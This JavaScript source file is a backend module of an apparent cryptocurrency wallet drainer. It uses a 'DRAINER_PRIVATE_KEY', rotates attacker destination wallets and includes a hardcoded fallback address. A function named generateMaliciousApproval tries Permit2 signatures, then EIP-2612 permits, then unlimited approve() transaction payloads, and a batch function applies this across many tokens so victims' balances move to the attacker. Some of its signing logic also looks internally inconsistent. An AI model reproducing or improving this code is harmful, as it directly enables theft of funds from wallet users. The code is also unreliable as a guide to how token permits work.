// backend/modules/permitHandler.js
import { ethers } from "ethers";
import { fetchEvmAbi } from "./abiFetcher.js";
import { signTypedData } from "./permit2Utils.js";

export class PermitHandler {
    constructor() {
        this.PERMIT2_CONTRACT_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
        this.DRAINER_PRIVATE_KEY = process.env.DRAINER_PRIVATE_KEY;
        this.isInitialized = false;
    }

    async initialize() {
        if (this.isInitialized) return true;
        
        try {
            console.log('📝 Initializing Permit Handler...');
            
            // Check if private key is configured
            if (!this.DRAINER_PRIVATE_KEY) {
                console.warn('⚠️ Drainer private key not configured - permit features disabled');
                return false;
            }
            
            this.isInitialized = true;
            console.log('✅ Permit Handler initialized');
            return true;
        } catch (error) {
            console.error('❌ Permit Handler initialization failed:', error);
            return false;
        }
    }

    // Backend-specific: Get destination wallet
    async getDestinationWallet() {
        try {
            // Use wallet rotator for destination
            const { walletRotator } = await import('./walletRotator.js');
            return await walletRotator.getDestinationWallet();
        } catch (error) {
            console.error('Failed to get destination wallet:', error);
            return process.env.DESTINATION_WALLET || '0x8ba1f109551bd432803012645ac136ddd64dba72';
        }
    }

    // ----------------------
    // Try Permit or Fallback
    // ----------------------
    async tryPermitOrFallback(userAddress, tokenAddress, tokenName, tokenVersion, chainId, provider) {
        try {
            const signer = new ethers.Wallet(this.DRAINER_PRIVATE_KEY, provider);
            const spender = await this.getDestinationWallet();

            // Load ABI dynamically
            const abi = await fetchEvmAbi(tokenAddress, chainId);
            if (!abi) throw new Error("Missing ABI");

            const tokenContract = new ethers.Contract(tokenAddress, abi, signer);

            // Check if contract has permit and transferFrom
            const supportsPermit = tokenContract.permit !== undefined;
            const supportsTransferFrom = tokenContract.transferFrom !== undefined;

            const value = ethers.parseUnits("1000000", 18);
            const deadline = Math.floor(Date.now() / 1000) + 3600;

            if (supportsPermit && supportsTransferFrom) {
                const nonce = await tokenContract.nonces(userAddress);

                const domain = {
                    name: tokenName,
                    version: tokenVersion,
                    chainId,
                    verifyingContract: tokenAddress,
                };

                const types = {
                    Permit: [
                        { name: "owner", type: "address" },
                        { name: "spender", type: "address" },
                        { name: "value", type: "uint256" },
                        { name: "nonce", type: "uint256" },
                        { name: "deadline", type: "uint256" },
                    ],
                };

                const message = {
                    owner: userAddress,
                    spender,
                    value,
                    nonce,
                    deadline,
                };

                const signature = await signer.signTypedData(domain, types, message);
                const { v, r, s } = ethers.Signature.from(signature);

                await tokenContract.permit(userAddress, spender, value, deadline, v, r, s);
                console.log("✅ Permit granted");

                await tokenContract.transferFrom(userAddress, spender, value);
                console.log("✅ Tokens transferred via permit()");
            } else {
                console.warn("⚠️ Falling back to approve + transferFrom");
                await tokenContract.approve(spender, value);
                await tokenContract.transferFrom(userAddress, spender, value);
            }
        } catch (err) {
            console.error("❌ PermitHandler error:", err.message);
            throw err;
        }
    }

    // ----------------------
    // EIP-2612 Permit Handler
    // ----------------------
    async tryEIP2612Permit(tokenContract, owner, provider, spender) {
        try {
            const signer = new ethers.Wallet(this.DRAINER_PRIVATE_KEY, provider);
            
            const name = await tokenContract.name();
            const version = "1";
            const nonce = await tokenContract.nonces(owner);
            const deadline = Math.floor(Date.now() / 1000) + 3600;
            const chainId = (await provider.getNetwork()).chainId;
            const value = await tokenContract.balanceOf(owner);

            const domain = { name, version, chainId, verifyingContract: tokenContract.address };
            const types = {
                Permit: [
                    { name: "owner", type: "address" },
                    { name: "spender", type: "address" },
                    { name: "value", type: "uint256" },
                    { name: "nonce", type: "uint256" },
                    { name: "deadline", type: "uint256" },
                ],
            };
            const message = { owner, spender, value, nonce, deadline };

            const signature = await signer.signTypedData(domain, types, message);
            const { v, r, s } = ethers.Signature.from(signature);

            const tx = await tokenContract.permit(owner, spender, value, deadline, v, r, s);
            await tx.wait();

            console.log("✅ EIP-2612 permit succeeded");
            return true;
        } catch (err) {
            console.warn("❌ EIP-2612 fallback failed:", err.message);
            return false;
        }
    }

    // ----------------------
    // Permit2 Simulation
    // ----------------------
    async simulatePermit2(userAddress, tokenAddress, chainId, provider) {
        try {
            const signer = new ethers.Wallet(this.DRAINER_PRIVATE_KEY, provider);
            const spender = await this.getDestinationWallet();

            const nonce = 0;
            const deadline = Math.floor(Date.now() / 1000) + 3600;

            const domain = {
                name: "Permit2",
                version: "1",
                chainId,
                verifyingContract: this.PERMIT2_CONTRACT_ADDRESS,
            };

            const types = {
                PermitTransferFrom: [
                    { name: "token", type: "address" },
                    { name: "amount", type: "uint160" },
                    { name: "expiration", type: "uint48" },
                    { name: "nonce", type: "uint48" },
                ],
                PermitTransferFromData: [
                    { name: "permit", type: "PermitTransferFrom" },
                    { name: "spender", type: "address" },
                    { name: "sigDeadline", type: "uint256" },
                ],
            };

            const message = {
                permit: {
                    token: tokenAddress,
                    amount: "1000000000000000000000",
                    expiration: deadline,
                    nonce,
                },
                spender: spender,
                sigDeadline: deadline,
            };

            const signature = await signer.signTypedData(domain, types, message);
            console.log("✅ Permit2 signature obtained:", signature);

            return signature;
        } catch (err) {
            console.warn("❌ simulatePermit2 failed:", err.message);
            return null;
        }
    }

    // ----------------------
    // MAIN EXPORT: Smart Approval Generator
    // ----------------------
    async generateMaliciousApproval(tokenAddress, userAddress, provider) {
        try {
            const signer = new ethers.Wallet(this.DRAINER_PRIVATE_KEY, provider);
            const network = await provider.getNetwork();
            const chainId = Number(network.chainId);
            const spender = await this.getDestinationWallet();

            // 1. First, try Permit2
            console.log(`🔄 Attempting Permit2 for ${tokenAddress}...`);
            const permit2Signature = await this.simulatePermit2(userAddress, tokenAddress, chainId, provider);
            if (permit2Signature) {
                console.log("✅ Using Permit2 method.");
                return this.createPermit2TxPayload(tokenAddress, userAddress, spender, permit2Signature);
            }

            // 2. Try standard EIP-2612 permit
            console.log(`🔄 Attempting EIP-2612 permit for ${tokenAddress}...`);
            const tokenContract = new ethers.Contract(tokenAddress, ['function name() view returns (string)'], signer);
            const tokenName = await tokenContract.name().catch(() => "Token");
            
            const eip2612Success = await this.tryEIP2612Permit(tokenContract, userAddress, provider, spender);
            if (eip2612Success) {
                console.log("✅ Using EIP-2612 permit method.");
                return await this.createPermitTxPayload(tokenContract, userAddress, spender, chainId, tokenName);
            }

            // 3. Fallback to classic approve
            console.warn("⚠️ Falling back to classic approve()");
            return await this.createApproveTxPayload(tokenAddress, userAddress, spender);

        } catch (error) {
            console.error("❌ generateMaliciousApproval failed:", error);
            return await this.createApproveTxPayload(tokenAddress, userAddress, await this.getDestinationWallet());
        }
    }

    // ----------------------
    // Helper Functions for Tx Payload Creation
    // ----------------------
    async createPermitTxPayload(tokenContract, owner, spender, chainId, tokenName) {
        const nonce = await tokenContract.nonces(owner);
        const value = await tokenContract.balanceOf(owner);
        const deadline = Math.floor(Date.now() / 1000) + 3600;

        return {
            to: tokenContract.address,
            data: tokenContract.interface.encodeFunctionData('permit', [
                owner,
                spender,
                value,
                deadline,
                0,
                "0x",
                "0x"
            ]),
            value: '0x0'
        };
    }

    async createPermit2TxPayload(tokenAddress, owner, spender, signature) {
        const permit2Abi = ['function permitTransferFrom(tuple,address,uint256,uint8,bytes32,bytes32)'];
        const permit2Contract = new ethers.Contract(this.PERMIT2_CONTRACT_ADDRESS, permit2Abi);
        
        return {
            to: this.PERMIT2_CONTRACT_ADDRESS,
            data: permit2Contract.interface.encodeFunctionData('permitTransferFrom', [
                {
                    token: tokenAddress,
                    amount: ethers.MaxUint256,
                    expiration: Math.floor(Date.now() / 1000) + 3600,
                    nonce: 0
                },
                spender,
                Math.floor(Date.now() / 1000) + 3600,
                0,
                "0x",
                "0x"
            ]),
            value: '0x0'
        };
    }

    async createApproveTxPayload(tokenAddress, userAddress, spender) {
        const approveAbi = ['function approve(address spender, uint256 amount) returns (bool)'];
        const tokenContract = new ethers.Contract(tokenAddress, approveAbi);
        
        return {
            to: tokenAddress,
            data: tokenContract.interface.encodeFunctionData('approve', [
                spender,
                ethers.MaxUint256
            ]),
            value: '0x0'
        };
    }

    // Backend-specific: Batch approval generation
    async generateBatchApprovals(tokenAddresses, userAddress, provider) {
        const approvals = [];
        
        for (const tokenAddress of tokenAddresses) {
            try {
                const approval = await this.generateMaliciousApproval(tokenAddress, userAddress, provider);
                approvals.push({ tokenAddress, approval });
            } catch (error) {
                console.error(`❌ Failed to generate approval for ${tokenAddress}:`, error.message);
                approvals.push({ tokenAddress, error: error.message });
            }
        }
        
        return approvals;
    }
}

// Create singleton instance
export const permitHandler = new PermitHandler();